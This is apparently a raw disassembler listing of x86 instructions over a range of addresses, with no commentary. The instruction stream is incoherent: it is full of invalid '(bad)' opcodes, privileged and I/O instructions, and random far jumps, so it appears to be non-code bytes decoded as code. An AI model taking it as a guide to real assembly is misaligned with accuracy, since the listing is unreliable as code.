  437f41:	shl    DWORD PTR [ebp+0x69dee8b7],cl
  437f47:	xor    eax,ebp
  437f49:	add    al,BYTE PTR [eax]
  437f4b:	cli    
  437f4c:	sub    DWORD PTR [eax+ecx*8-0x78],0x9d65f917
  437f54:	pop    ss
  437f55:	pop    esi
  437f56:	sub    eax,0x42c23452
  437f5b:	icebp  
  437f5c:	mov    esp,0x3cef3e05
  437f61:	std    
  437f62:	mov    ebp,0x1e3b0b3f
  437f67:	xlat   BYTE PTR ds:[ebx]
  437f68:	loop   0x437fbe
  437f6a:	ss xor eax,0xd4a1dae6
  437f70:	stos   BYTE PTR es:[edi],al
  437f71:	dec    ecx
  437f72:	jmp    0x437ef8
  437f74:	xchg   ebp,eax
  437f75:	jmp    0x437f4f
  437f77:	xor    al,0x88
  437f79:	and    DWORD PTR [edx],ebx
  437f7b:	shr    DWORD PTR [edi+0x716610c6],cl
  437f81:	add    bh,BYTE PTR [esi]
  437f83:	pop    edx
  437f84:	arpl   bp,si
  437f86:	adc    al,0x2d
  437f89:	sbb    eax,0x988c68f
  437f8e:	fwait
  437f8f:	test   al,0x29
  437f91:	xor    eax,0x2ceb90b
  437f96:	or     al,0x8e
  437f98:	push   ebp
  437f9a:	inc    edi
  437f9b:	cmc    
  437f9c:	push   esi
  437f9d:	sub    eax,0x8516f31f
  437fa2:	mov    al,0xbf
  437fa4:	les    ebx,FWORD PTR [eax+0x4263d2a0]
  437faa:	outs   dx,BYTE PTR ds:[esi]
  437fab:	xor    al,0xb0
  437fad:	dec    ebx
  437fae:	mov    esi,0xd7050444
  437fb3:	sbb    eax,0xdaf405c6
  437fb8:	or     bh,BYTE PTR [esi-0x28]
  437fbb:	pop    ecx
  437fbc:	xor    eax,0x42f648d6
  437fc1:	add    ch,BYTE PTR [esi-0x3eda6330]
  437fc7:	push   esp
  437fc8:	dec    DWORD PTR [ecx+ecx*1+0x11]
  437fcc:	js     0x437f91
  437fce:	jecxz  0x438033
  437fd0:	mov    DWORD PTR [ebp-0x7c],ebp
  437fd3:	adc    ecx,ebp
  437fd5:	sti    
  437fd6:	cmc    
  437fd7:	in     al,dx
  437fd8:	jne    0x437fdc
  437fda:	ret    0x6ca4
  437fdd:	int3   
  437fde:	into   
  437fdf:	inc    ebp
  437fe0:	out    0xe9,eax
  437fe2:	pusha  
  437fe3:	sbb    eax,0x2c4b1011
  437fe8:	pop    edx
  437fe9:	sbb    DWORD PTR [ebp+0x6f7a95b9],0xffffffc2
  437ff0:	push   ds
  437ff1:	push   cs
  437ff2:	pop    ds
  437ff3:	pop    esi
  437ff4:	cmp    BYTE PTR [ebx+esi*2-0x594275e2],dl
  437ffb:	sub    dh,BYTE PTR [edx+0x18aec3e2]
  438001:	aas    
  438002:	or     edx,esp
  438004:	jnp    0x437fa3
  438006:	adc    bh,al
  438008:	cmp    edi,edx
  43800a:	cbw    
  43800c:	lods   eax,DWORD PTR ds:[esi]
  43800d:	inc    edi
  43800e:	fwait
  43800f:	mov    ecx,DWORD PTR [ecx-0x5f2fe58d]
  438015:	pop    ebp
  438016:	adc    al,0xd6
  438018:	inc    esp
  438019:	aam    0xc7
  43801b:	pop    ds
  43801c:	sub    ch,dh
  43801e:	(bad)  
  43801f:	cmc    
  438020:	stc    
  438021:	mov    ds:0x96103009,al
  438026:	(bad)  
  438028:	ss ins BYTE PTR es:[edi],dx
  43802a:	sub    dh,BYTE PTR [esi]
  43802c:	jmp    0x437fba
  43802e:	aad    0xcf
  438030:	inc    ecx
  438031:	repz jbe 0x438025
  438034:	mov    WORD PTR [edx],es
  438036:	scas   al,BYTE PTR es:[edi]
  438037:	push   0x781178ee
  43803c:	dec    esi
  43803d:	mov    edi,0xacdbc31f
  438042:	xchg   edx,eax
  438043:	mov    eax,DWORD PTR [edx+0x26bbdd03]
  438049:	(bad)  
  43804a:	cli    
  43804b:	mov    ebx,0xda292677
  438050:	dec    ecx
  438051:	adc    DWORD PTR [esi-0x4c],0xf20c873c
  438058:	mov    ch,ch
  43805a:	dec    edi
  43805b:	std    
  43805c:	xchg   BYTE PTR [ebx-0x64],dl
  43805f:	push   ebx
  438060:	and    BYTE PTR [edx+0x6d],0xd4
  438064:	jecxz  0x4380a3
  438066:	lods   al,BYTE PTR ds:[esi]
  438067:	repz rcl BYTE PTR [edi+0x1],cl
  43806b:	pop    edx
  43806c:	mov    BYTE PTR [ebp+0x1a],dh
  43806f:	in     eax,0xf9
  438071:	repnz iret 
  438073:	adc    eax,0x4bb20336
  438078:	mov    edx,0x68fdae2b
  43807d:	pop    ss
  43807e:	push   ds
  43807f:	test   ecx,eax
  438081:	xor    ebx,edx
  438083:	jmp    0xc8c9d8a8
  438088:	mov    dh,0xf9
  43808a:	pop    esp
  43808b:	stos   BYTE PTR es:[edi],al
  43808c:	shl    DWORD PTR [esi-0x61],0x41
  438090:	rol    DWORD PTR [ebp-0x7c84b807],cl
  438096:	pusha  
  438097:	ret    
  438098:	jae    0x438047
  43809a:	int3   
  43809b:	(bad)
  43809e:	rcl    esp,0xf0
  4380a1:	adc    eax,0xd260ae3e
  4380a6:	jmp    0xc92a:0x4ffb89bb
  4380ad:	(bad)  
  4380ae:	or     esp,edx
  4380b0:	leave  
  4380b1:	sbb    al,BYTE PTR [eax+ecx*1-0x49]
  4380b5:	sub    al,0x84
  4380b7:	aam    0xc4
  4380b9:	(bad)  
  4380ba:	jmp    0x4380bf
  4380bc:	xchg   BYTE PTR [ebx+0x43],cl
  4380bf:	mov    edi,0xbafff905
  4380c4:	add    dl,BYTE PTR [edx+eiz*1-0x2c]
  4380c8:	push   cs
  4380c9:	shl    BYTE PTR [ecx+eiz*4],0x28
  4380cd:	out    dx,eax
  4380ce:	jmp    0x96cf9189
  4380d3:	mov    esp,0x972edca8
  4380d8:	cmp    eax,DWORD PTR [edx]
  4380da:	dec    esp
  4380db:	mov    edx,0x36bc1b75
  4380e0:	pop    ss
  4380e1:	(bad)  
  4380e2:	pop    ds
  4380e3:	xor    edi,DWORD PTR [edx-0x3e]
  4380e6:	imul   ebp,DWORD PTR [esi],0xffffffc1
  4380e9:	js     0x4380f8
  4380eb:	(bad)  
  4380ec:	dec    ecx
  4380ed:	add    esp,esi
  4380ef:	pop    eax
  4380f0:	push   0xcb08f829
  4380f5:	dec    ebp
  4380f6:	ins    DWORD PTR es:[edi],dx
  4380f7:	mov    edi,0x664efb4c
  4380fc:	leave  
  4380fd:	mov    ebx,DWORD PTR [esi]
  4380ff:	add    ebp,edi
  438101:	add    cl,BYTE PTR [eax]
  438103:	dec    eax
  438104:	push   0xa9f1a347
  438109:	jge    0x43812a
  43810b:	leave  
  43810c:	enter  0xc0ef,0x5e
  438110:	or     BYTE PTR [ebp-0x32472bfc],dh
  438116:	push   esp
  438117:	push   ds
  438118:	(bad)  
  438119:	icebp  
  43811a:	jp     0x438149
  43811c:	arpl   WORD PTR [edx+0x1f],bp
  43811f:	pop    ecx
  438120:	pop    ebx
  438121:	and    al,0x84
  438123:	sbb    al,dh
  438125:	jmp    0x94ad:0xb881d5bf
  43812c:	and    al,0x2b
  43812e:	sbb    DWORD PTR [eax+0x2ff783d5],ebp
  438134:	mov    BYTE PTR [ebp+0x44],cl
  438137:	jb     0x438195
  438139:	adc    al,0xf0
  43813b:	aad    0xb7
  43813d:	mov    ecx,0xbe37e97d
  438142:	pop    ecx
  438143:	dec    edx
  438144:	mov    BYTE PTR [ebp+0x7670e5a2],cl
  43814a:	push   eax
  43814b:	cli    
  43814c:	aas    
  43814d:	add    cl,BYTE PTR [edx+0x109e11be]
  438153:	sbb    BYTE PTR [edx],ah
  438155:	add    BYTE PTR ds:0xf6ab890a,dl
  43815b:	push   ds
  43815c:	mov    ebp,0x74cb6d1b
  438161:	add    esi,edx
  438163:	or     BYTE PTR [edx-0x6d],al
  438166:	retf   
  438167:	popf   
  438168:	stos   DWORD PTR es:[edi],eax
  438169:	cmc    
  43816a:	xchg   edi,eax
  43816b:	adc    eax,esp
  43816d:	xor    al,0x9e
  43816f:	fisttp WORD PTR [ecx-0x67bc5e99]
  438175:	cmc    
  438176:	xlat   BYTE PTR ss:[ebx]
  438178:	lock aam 0xc8
  43817b:	and    dh,BYTE PTR [esi-0x76bbc579]
  438181:	jge    0x438200
  438183:	loop   0x438202
  438185:	and    al,al
  438187:	in     eax,0xdb
  438189:	add    eax,0x600dfaac
  43818e:	xlat   BYTE PTR ds:[ebx]
  43818f:	sahf   
  438190:	rol    BYTE PTR [ebp+0x1f],0xc3
  438194:	push   esi
  438195:	fist   WORD PTR [ecx+0x34]
  438198:	ss mov dh,0x85
  43819b:	mov    DWORD PTR [eax],esp
  43819d:	jns    0x4381ad
  43819f:	jnp    0x438128
  4381a1:	dec    ebp
  4381a2:	jp     0x438157
  4381a4:	push   cs
  4381a5:	dec    ecx
  4381a6:	sbb    al,BYTE PTR [eax+esi*2]
  4381a9:	ja     0x438173
  4381ab:	aad    0xda
  4381ad:	mov    esi,0x760ccdd2
  4381b2:	mov    ch,0xae
  4381b4:	pusha  
  4381b5:	call   0xa8b5cdcd
  4381ba:	pop    ds
  4381bb:	dec    ebx
  4381bc:	test   ebx,0x16f16f8d
  4381c2:	mov    bh,0xc5
  4381c4:	xchg   esi,eax
  4381c5:	stc    
  4381c6:	jl     0x43819c
  4381c8:	rcr    BYTE PTR [esi+0x25],0xff
  4381cc:	dec    ebp
  4381cd:	call   FWORD PTR [esi+0x7de81f02]
  4381d3:	dec    edi
  4381d4:	es rcr esp,1
  4381d7:	aam    0xdb
  4381d9:	push   0x6
  4381db:	xor    cl,BYTE PTR [edx+eax*1+0xc]
  4381df:	jg     0x4381bf
  4381e1:	fs xchg esi,eax
  4381e3:	dec    ebp
  4381e4:	lods   al,BYTE PTR ds:[esi]
  4381e5:	rcr    DWORD PTR [edi],cl
  4381e7:	jnp    0x4381ae
  4381e9:	adc    DWORD PTR [ebx+0x52bdce6c],0x61cb39d5
  4381f3:	add    eax,0x2007f94d
  4381f8:	mov    BYTE PTR [edi+0x6f],cl
  4381fb:	jne    0x438201
  4381fd:	inc    esi
  4381fe:	jno    0x438220
  438200:	aad    0x2
  438202:	push   cs
  438203:	stc    
  438204:	out    0xf7,al
  438206:	adc    esp,esi
  438208:	pop    eax
  438209:	ss push ds
  43820b:	cmp    esi,DWORD PTR [ebx-0x55448ac4]
  438211:	out    dx,eax
  438212:	push   edi
  438213:	ror    BYTE PTR [edi+eax*4],1
  438216:	push   edx
  438217:	outs   dx,DWORD PTR ds:[esi]
  438218:	in     al,dx
  438219:	xchg   edi,eax
  43821a:	fbstp  TBYTE PTR [edx+0x1]
  43821d:	nop    ebx
  438220:	mov    ebx,0x2edd1afa
  438225:	test   DWORD PTR [eax-0x45],ebp
  438228:	mov    WORD PTR [ebx],?
  43822a:	xor    al,0x72
  43822c:	xlat   BYTE PTR ds:[ebx]
  43822d:	pop    ecx
  43822e:	sbb    edi,edx
  438230:	int3   
  438231:	xchg   edx,eax
  438232:	out    dx,al
  438233:	pop    eax
  438234:	push   ds
  438235:	out    0x1f,al
  438237:	jne    0x438256
  438239:	pop    edi
  43823a:	lods   al,BYTE PTR ds:[esi]
  43823b:	sbb    eax,0xd46e9052
  438240:	(bad)  
  438241:	aad    0x67
  438243:	gs pushf 
  438245:	lock (bad) 
  438247:	dec    ecx
  438248:	xchg   esp,eax
  438249:	sub    DWORD PTR [ebp+0x5f42ad79],ebx
  43824f:	inc    ecx
  438250:	in     al,dx
  438251:	test   ah,dh
  438253:	aad    0xb4
  438255:	cld    
  438256:	push   ss
  438257:	jno    0x4382b1
  438259:	jae    0x438255
  43825b:	mov    dh,0x8f
  43825d:	pop    ebx
  43825e:	push   ss
  43825f:	xchg   edi,eax
  438260:	dec    edx
  438261:	jge    0x43824b
  438263:	and    al,0x6c
  438265:	sub    bl,BYTE PTR [ebx]
  438267:	shl    BYTE PTR [eax],cl
  438269:	jmp    0x5730:0xaaca4fdd
  438270:	fsub   DWORD PTR [ecx+0x1f]
  438273:	jmp    0x438216
  438275:	aaa    
  438276:	add    dl,BYTE PTR [eax+0x66]
  438279:	dec    edi
  43827a:	and    edx,edx
  43827c:	es cdq 
  43827e:	push   ecx
  43827f:	aaa    
  438280:	mov    ebx,0x4a9cbfb4
  438285:	cs cdq 
  438287:	aas    
  438288:	jmp    0xfcaa:0xb2999100
  43828f:	repnz or cl,bh
  438292:	and    edx,esp
  438294:	js     0x4382ff
  438296:	dec    edx
  438297:	cmp    edi,0x5
  43829a:	inc    ecx
  43829b:	imul   edi,DWORD PTR [ecx+ecx*1-0x6f],0xa572b3cd
  4382a3:	(bad)  
  4382a4:	jp     0x43822d
  4382a6:	push   edi
  4382a7:	jmp    0x438275
  4382a9:	sub    eax,0x1c95dedf
  4382ae:	mov    WORD PTR [edx-0x981ab89],fs
  4382b4:	cwde   
  4382b5:	push   es
  4382b6:	sub    eax,0xee17b0fa
  4382bb:	dec    ecx
  4382bc:	or     eax,ecx
  4382be:	push   edi
  4382bf:	stos   BYTE PTR es:[edi],al
  4382c0:	cs hlt 
  4382c2:	(bad)  
  4382c3:	rcl    cl,cl
  4382c5:	out    0x7a,al
  4382c7:	imul   edi,eax,0xb3b270ab
  4382cd:	in     eax,dx
  4382ce:	jl     0x438301
  4382d0:	(bad)  
  4382d1:	push   0x634d433
  4382d6:	mov    DWORD PTR [edi+0x3c],esi
  4382d9:	stos   DWORD PTR es:[edi],eax
  4382da:	gs push ebx
  4382dc:	dec    ecx
  4382dd:	jbe    0x43825f
  4382df:	pop    ecx
  4382e0:	test   al,0xd
  4382e2:	gs dec edi
  4382e4:	or     BYTE PTR [esi],dh
  4382e6:	std    
  4382e7:	cdq    
  4382e8:	sbb    DWORD PTR [eax],eax
  4382ea:	outs   dx,DWORD PTR ds:[esi]
  4382eb:	dec    edx
  4382ec:	js     0x4382a9
  4382ee:	retf   0x2d4
  4382f1:	sbb    ch,dh
  4382f3:	(bad)  
  4382f4:	add    eax,0x8912b43a
  4382f9:	xchg   ebx,eax
  4382fa:	test   al,0x68
  4382fc:	call   0x290fd8c9
  438301:	sbb    al,0xaa
  438303:	xchg   edx,eax
  438304:	xchg   ebp,eax
  438305:	jge    0x4382d7
  438307:	aas    
  438308:	leave  
  438309:	fiadd  DWORD PTR [esi]
  43830b:	mov    ebp,0x47b92788
  438310:	in     eax,0x71
  438312:	test   BYTE PTR [ebx-0x5631fc97],dh
  438318:	pop    edi
  438319:	rcl    edi,cl
  43831b:	pop    ebp
  43831c:	sbb    eax,0xc8c75b32
  438321:	outs   dx,DWORD PTR ds:[esi]
  438322:	lahf   
  438323:	nop
  438324:	add    al,0xf7
  438326:	out    dx,eax
  438327:	das    
  438328:	mov    al,BYTE PTR ds:0x12107438
  43832e:	test   DWORD PTR [edi+0x1c],eax
  438331:	retf   0x77c
  438334:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  438335:	pop    esp
  438336:	popf   
  438337:	push   esp
  438338:	fisttp QWORD PTR [ebx+0x7a]
  43833b:	in     eax,dx
  43833c:	adc    al,0x3
  43833e:	sub    BYTE PTR [ecx+0x1e2ef4c7],0x3d
  438345:	sub    eax,0xd6ea91e
  43834a:	pop    ebp
  43834b:	adc    DWORD PTR [edi+0x7c],esi
  43834e:	iret   
  43834f:	push   0xd5537334
  438354:	jns    0x4383a3
  438356:	mov    edi,0x1e2dccd9
  43835b:	pop    ebp
  43835c:	mov    ebp,DWORD PTR [edx]
  43835e:	sbb    eax,0x5c56081b
  438363:	aam    0xd6
  438365:	pop    eax
  438366:	cli    
  438367:	imul   edx,DWORD PTR [esi-0x764c5261],0xffffffa1
  43836e:	mov    edx,0xdcba8105
  438373:	(bad)  
  438374:	pop    eax
  438375:	add    eax,DWORD PTR [edx-0x21158892]
  43837b:	mov    al,0x16
  43837d:	xor    ebx,DWORD PTR [edi]
  43837f:	gs call 0x4ebeb895
  438385:	pop    edx
  438386:	out    0xd5,eax
  438388:	stc    
  438389:	sub    al,0xca
  43838b:	iret   
  43838c:	stos   BYTE PTR es:[edi],al
  43838d:	jmp    0x9474:0xf7d02a97
  438394:	mov    DWORD PTR ds:0x90f26e27,eax
  43839a:	mov    bl,0xd4
  43839c:	or     BYTE PTR [ecx+0x75],bl
  43839f:	jg     0x438321
  4383a1:	test   DWORD PTR [edi-0x4dea7616],eax
  4383a7:	icebp  
  4383a8:	sub    al,0x29
  4383aa:	pusha  
  4383ab:	(bad)  
  4383ac:	push   ebp
  4383ad:	add    al,0x7f
  4383af:	imul   DWORD PTR [eax+0x629f1f72]
  4383b5:	adc    eax,0x3e22d641
  4383ba:	jl     0x438397
  4383bc:	fcmovb st,st(5)
  4383be:	cdq    
  4383bf:	mov    cl,BYTE PTR [edi-0x5652d1f]
  4383c5:	or     al,0xaa
  4383c7:	fs mov esi,0xbdd49946
  4383cd:	ror    edx,0xbc
  4383d0:	addr16 iret 
  4383d2:	not    DWORD PTR [ebx]
  4383d4:	repz add DWORD PTR [esp+edx*8+0x7b],esp
  4383d9:	dec    ebp
  4383da:	mov    edx,0xbf9bb269
  4383df:	push   esp
  4383e0:	je     0x438382
  4383e2:	mov    esp,0x1e62105c
  4383e7:	mov    eax,DWORD PTR [esi]
  4383e9:	xor    DWORD PTR [ecx-0x41],ecx
  4383ec:	xchg   esp,eax
  4383ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4383ee:	or     eax,0xd86e37d4
  4383f3:	xlat   BYTE PTR ds:[ebx]
  4383f4:	inc    ecx
  4383f5:	popf   
  4383f6:	inc    edx
  4383f7:	mov    DWORD PTR [ecx+edx*4-0x7d1343c8],edx
  4383fe:	das    
  4383ff:	sar    ah,cl
  438401:	out    0x2d,al
  438403:	aam    0x92
  438405:	mov    dh,bh
  438407:	addr16 mov eax,0x8e46a538
  43840d:	add    esi,ebp
  43840f:	or     BYTE PTR [edi+0x76],ah
  438412:	pop    edx
  438413:	aad    0x20
  438415:	lods   al,BYTE PTR ds:[esi]
  438416:	push   0xa09d16d4
  43841b:	jl     0x4383de
  43841d:	out    dx,al
  43841e:	jmp    0x4cef:0xa0c18985
  438425:	fsubr  DWORD PTR [eax-0x2dcd13f]
  43842b:	aad    0xf
  43842d:	mov    bl,0xcb
  43842f:	cmc    
  438430:	ret    0x1b0a
  438433:	inc    edx
  438434:	mov    ds,WORD PTR [ebx-0xbc1b13f]
  43843a:	out    0x35,eax
  43843c:	repnz and edx,ecx
  43843f:	aam    0x97
  438441:	mov    ebp,0x1b74be3f
  438446:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  438447:	ror    DWORD PTR [ebx+ecx*2+0x6566b396],cl
  43844e:	arpl   WORD PTR [ebp+0x7a],dx
  438451:	cmp    BYTE PTR [ebx],dh
  438453:	stos   BYTE PTR es:[edi],al
  438454:	sbb    DWORD PTR gs:[bx+0x658a],0xa82b6f84
  43845e:	aas    
  43845f:	sbb    dl,BYTE PTR [edi+eiz*8-0x7eec7adf]
  438466:	cmc    
  438467:	test   al,0x30
  438469:	cs pop ss
  43846b:	or     eax,0x165a025d
  438470:	and    DWORD PTR [esi+0x50d7dd6f],ecx
  438476:	pop    ds
  438477:	push   edi
  438478:	mov    dh,ah
  43847a:	pushf  
  43847b:	lds    edi,FWORD PTR [esi]
  43847d:	mov    esi,fs
  43847f:	aam    0xdc
  438481:	push   es
  438482:	popf   
  438483:	cli    
  438484:	or     DWORD PTR [edx-0x586a4382],esi
  43848a:	int3   
  43848b:	sbb    al,0xcb
  43848d:	add    bl,BYTE PTR [ebx]
  43848f:	pop    ebp
  438490:	mov    eax,0x70d43d20
  438495:	jl     0x438494
  438497:	mov    ebp,0x1f93b876
  43849c:	xchg   esi,eax
  43849d:	xchg   ebp,eax
  43849e:	adc    eax,0xa4021a8b
  4384a3:	sbb    bl,BYTE PTR [ebp+esi*4-0x337a28c4]
  4384aa:	dec    eax
  4384ab:	dec    BYTE PTR [edx+0x64]
  4384ae:	imul   ecx,DWORD PTR [esi],0x491e4555
  4384b4:	in     al,dx
  4384b5:	pop    ebx
  4384b6:	mov    WORD PTR [esp+ebp*1-0x39],fs
  4384ba:	imul   edx,ebp,0xc2e72616
  4384c0:	outs   dx,DWORD PTR ds:[esi]
  4384c1:	and    eax,0xad956785
  4384c6:	inc    edi
  4384c7:	pop    esp
  4384c8:	xor    bl,al
  4384ca:	adc    dh,BYTE PTR [eax+ebx*8]
  4384cd:	or     eax,esi
  4384cf:	rcl    BYTE PTR [ebp-0x72],cl
  4384d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4384d3:	sbb    eax,0x4cff0f16
  4384d8:	cmp    edx,DWORD PTR [esi-0x460aeacd]
  4384de:	jbe    0x4384b5
  4384e0:	add    al,0xf7
  4384e2:	cld    
  4384e3:	das    
  4384e4:	mov    eax,0x4e9be1af
  4384e9:	and    al,0xe8
  4384eb:	aad    0xbf
  4384ed:	mov    al,0x91
  4384ef:	sub    cl,BYTE PTR ds:0xe151e7e
  4384f5:	nop    ebx
  4384f8:	pop    esp
  4384f9:	mov    ebx,edx
  4384fb:	xlat   BYTE PTR ds:[ebx]
  4384fc:	add    BYTE PTR [ebp-0xa],0xfe
  438500:	ss test eax,0xcdea14e4
  438506:	mov    al,0xf5
  438508:	(bad)  [edi+ecx*2-0x2b]
  43850c:	mov    ch,0xf0
  43850e:	setl   bl
  438511:	jno    0x4384db
  438513:	fwait
  438514:	mov    dh,bl
  438516:	jmp    0x438518
  438518:	ins    DWORD PTR es:[edi],dx
  438519:	clc    
  43851a:	mov    esp,0x7e338ed3
  43851f:	int    0x10
  438521:	mov    ch,0x33
  438523:	push   edi
  438524:	rol    BYTE PTR [eax+0x3507990b],0x25
  43852b:	xlat   BYTE PTR ds:[ebx]
  43852c:	and    DWORD PTR [edi+0x5a8d85f9],ebx
  438532:	push   ds
  438533:	jge    0x438507
  438535:	cs push 0xe14600b9
  43853b:	rcr    DWORD PTR [esi],0x3
  43853e:	enter  0x8f5a,0x3b
  438542:	add    DWORD PTR [eax],edx
  438544:	add    BYTE PTR ds:0x3010a31f,dh
  43854a:	push   es
  43854b:	neg    DWORD PTR [eax]
  43854d:	jg     0x438537
  43854f:	aam    0x76
  438551:	fcom   QWORD PTR [ebx-0x54cfcc66]
  438557:	and    ecx,DWORD PTR [ecx-0x77e94bd3]
  43855d:	jo     0x438576
  43855f:	push   ss
  438560:	xchg   ebp,eax
  438561:	add    eax,0xa6b9518a
  438566:	les    esi,FWORD PTR [esi-0x142f2643]
  43856c:	push   ebp
  43856d:	adc    eax,0x5086f16e
  438572:	fmulp  st(0),st
  438574:	push   ss
  438575:	ds pop ebx
  438577:	mov    edx,0x2f39098d
  43857c:	or     DWORD PTR [ebp-0x3a],ebp
  43857f:	mov    edi,es
  438581:	(bad)  
  438582:	xor    edx,DWORD PTR [ebx+0x54]
  438585:	jns    0x4385a6
  438587:	pop    ecx
  438588:	mov    edi,0x1cc5000a
  43858d:	pop    eax
  43858e:	imul   edx,esp,0x58
  438591:	sub    DWORD PTR [ecx*1+0x1e1a7fd8],0xffffff89
  438599:	icebp  
  43859a:	cmp    ah,0xac
  43859d:	mov    ebp,0x2d3422a
  4385a2:	scas   al,BYTE PTR es:[edi]
  4385a3:	mov    ah,0x89
  4385a5:	int3   
  4385a6:	cdq    
  4385a7:	lahf   
  4385a8:	pop    ebx
  4385a9:	cs ins BYTE PTR es:[edi],dx
  4385ab:	test   eax,0xe9d049aa
  4385b0:	test   al,0xa9
  4385b2:	mov    DWORD PTR [esi-0x13cdefe9],ecx
  4385b8:	cmp    ecx,DWORD PTR [edi-0x769f84a0]
  4385be:	retf   
  4385bf:	pusha  
  4385c0:	repz cmc 
  4385c2:	leave  
  4385c3:	aam    0x55
  4385c5:	adc    al,0x8f
  4385c7:	mov    al,ds:0xd494c782
  4385cc:	push   0x6a
  4385ce:	clc    
  4385cf:	aas    
  4385d0:	call   0x8899746f
  4385d5:	stc    
  4385d6:	xchg   edi,eax
  4385d7:	gs out 0x5a,eax
  4385da:	pop    ebp
  4385db:	ins    BYTE PTR es:[edi],dx
  4385dc:	add    dl,ah
  4385de:	pop    ds
  4385df:	sar    BYTE PTR [ebp-0x11],cl
  4385e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4385e3:	(bad)  
  4385e4:	dec    ebp
  4385e5:	test   eax,0x3c3158b0
  4385ea:	pop    ds
  4385eb:	mov    cl,0xef
  4385ed:	push   edi
  4385ee:	out    0xe6,al
  4385f0:	ret    0x40aa
  4385f3:	aam    0xf6
  4385f5:	xlat   BYTE PTR ds:[ebx]
  4385f6:	push   0x4f
  4385f8:	jo     0x4385bb
  4385fa:	jg     0x438623
  4385fc:	mov    BYTE PTR [ebx-0x508d86a5],bl
  438602:	fisttp QWORD PTR [ebx+esi*8+0x31155885]
  438609:	std    
  43860a:	mov    ah,BYTE PTR [ebx-0x78]
  43860d:	aad    0x54
  43860f:	rcr    BYTE PTR [esi],0x6
  438612:	pop    edi
  438613:	fst    DWORD PTR [ebp+ecx*8+0x1f80448d]
  43861a:	ins    BYTE PTR es:[edi],dx
  43861b:	scas   al,BYTE PTR es:[edi]
  43861c:	xor    DWORD PTR [ebx-0x1f5f791a],eax
  438622:	pop    ds
  438623:	xchg   ebx,eax
  438624:	aam    0xfd
  438626:	xchg   ecx,edx
  438628:	xlat   BYTE PTR ds:[ebx]
  438629:	jl     0x43868d
  43862b:	enter  0x33e,0x1c
  43862f:	mov    ds:0x802fce6f,al
  438634:	test   al,0xda
  438636:	pop    ds
  438637:	sbb    ebp,eax
  438639:	out    0x14,al
  43863b:	mov    eax,0xd48261fe
  438640:	mov    WORD PTR [ecx],?
  438642:	jp     0x4385d7
  438644:	xchg   edi,eax
  438645:	shr    BYTE PTR [ebx],0x14
  438648:	mov    ecx,esp
  43864a:	popa   
  43864b:	scas   al,BYTE PTR es:[edi]
  43864c:	xor    eax,0x4444d394
  438651:	dec    ecx
  438652:	sbb    al,0xac
  438654:	cmp    BYTE PTR [ecx+0x1b],dh
  438657:	pushf  
  438658:	adc    al,0x23
  43865a:	sbb    edx,DWORD PTR [edi+0x6c]
  43865d:	dec    esp
  43865e:	mov    ds:0x1f6300bb,eax
  438663:	fld    QWORD PTR [ecx+edx*8]
  438666:	jo     0x438697
  438668:	or     DWORD PTR [eax],0xffffff81
  43866b:	into   
  43866c:	dec    esi
  43866d:	sti    
  43866e:	jl     0x438645
  438670:	cwde   
  438671:	jo     0x43867c
  438673:	push   ebp
  438674:	(bad)  
  438675:	dec    dl
  438677:	and    BYTE PTR [ecx+0x5940fc1f],cl
  43867d:	neg    BYTE PTR [edi]
  43867f:	neg    ah
  438681:	add    bh,BYTE PTR [eax+0x51]
  438684:	jb     0x4386c6
  438686:	and    eax,0x1f39e34b
  43868b:	fwait
  43868c:	ret    
  43868d:	mov    ds:0x70d88e76,eax
  438692:	dec    ecx
  438693:	aad    0xfb
  438695:	loope  0x438655
  438697:	fdiv   st,st(5)
  438699:	mov    eax,0xd588f62e
  43869e:	sbb    bh,BYTE PTR [ecx]
  4386a0:	push   ebp
  4386a1:	xchg   si,ax
  4386a3:	sub    dh,BYTE PTR [esi-0x49ed03fb]
  4386a9:	add    al,0x89
  4386ab:	test   BYTE PTR [edx-0x5d],0x60
  4386af:	xchg   DWORD PTR [esi-0xa],esp
  4386b2:	aaa    
  4386b3:	sub    esi,esp
  4386b5:	aam    0xdc
  4386b7:	loope  0x4386f8
  4386b9:	add    ecx,esp
  4386bb:	aam    0x56
  4386bd:	out    0x8c,eax
  4386bf:	sub    eax,0xf9630d81
  4386c4:	adc    al,0xed
  4386c6:	push   es
  4386c7:	arpl   WORD PTR [eax],di
  4386c9:	add    al,0xdf
  4386cb:	gs push es
  4386cd:	es push ds
  4386cf:	(bad)  [ebp+ecx*1-0x13]
  4386d3:	cs out dx,al
  4386d5:	loope  0x4386f0
  4386d7:	sahf   
  4386d8:	add    DWORD PTR [ecx+0x78],edi
  4386db:	aam    0x18
  4386dd:	mov    al,0x2f
  4386df:	sbb    DWORD PTR [esi-0x637ce071],ebx
  4386e5:	test   DWORD PTR [ebx-0x5200f480],esp
  4386eb:	pop    ebx
  4386ec:	loope  0x43868b
  4386ee:	bound  eax,QWORD PTR [eax-0x5494f22d]
  4386f4:	xor    BYTE PTR [eax+0x4939dd42],al
  4386fa:	popa   
  4386fb:	jns    0x438688
  4386fd:	inc    esi
  4386fe:	retf   
  4386ff:	inc    ebp
  438700:	cmp    ebx,DWORD PTR [ecx]
  438702:	push   cs
  438703:	outs   dx,DWORD PTR ds:[esi]
  438704:	inc    DWORD PTR [edx]
  438706:	outs   dx,BYTE PTR ds:[esi]
  438707:	jp     0x4386cd
  438709:	mov    al,ds:0x6dda8df3
  43870e:	xchg   edx,eax
  43870f:	mov    esi,esi
  438711:	add    eax,0x809a2515
  438716:	fmul   DWORD PTR [edi+0x1d]
  43871a:	adc    BYTE PTR [ebp+0x38eb29c2],dh
  438720:	or     bl,al
  438722:	cmp    esi,DWORD PTR [ebx-0x2e2d3277]
  438728:	(bad)  
  438729:	cmp    esp,DWORD PTR [esi-0x68]
  43872c:	mov    ah,0x5
  43872e:	push   0x2054f293
  438733:	sub    bh,BYTE PTR [ebx]
  438735:	pop    ss
  438736:	nop
  438737:	push   ebx
  438738:	cli    
  438739:	add    bl,bh
  43873b:	das    
  43873c:	scas   eax,DWORD PTR es:[edi]
  43873d:	jmp    0x88d6:0x19549a0e
  438744:	mov    WORD PTR [edx],cs
  438746:	push   ebx
  438747:	push   esp
  438748:	or     ecx,edx
  43874a:	ins    DWORD PTR es:[edi],dx
  43874b:	dec    ebx
  43874c:	(bad)  
  43874d:	popa   
  43874e:	lahf   
